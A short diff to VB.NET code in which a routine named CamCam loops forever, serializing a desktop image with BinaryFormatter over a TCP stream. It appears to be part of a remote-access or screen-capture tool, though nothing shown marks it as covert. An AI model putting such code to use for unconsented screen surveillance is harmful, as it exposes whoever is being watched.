@@ -330,11 +330,19 @@ Public Class C
 
     Public Shared Sub CamCam()
         Dim bf As New BinaryFormatter
+        ns = TcpV.GetStream
         While True
 
-            ns = TcpV.GetStream
 
 
+            '  Dim p As New MemoryStream
+
+            ' Desk.Save(p, Desk.RawFormat)
+
+            ' Dim o As String = "|R|" & Encoding.Default.GetString(p.ToArray)
+            ' Dim mp As Byte() = Encoding.Default.GetBytes(o)
+
+            ' ns.WriteAsync(mp, 0, mp.Length)
             bf.Serialize(ns, Desk)
 
 
@@ -350,25 +358,6 @@ Public Class C
             EmptyWorkingSet(Process.GetCurrentProcess.Handle)
         End While
     End Sub
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
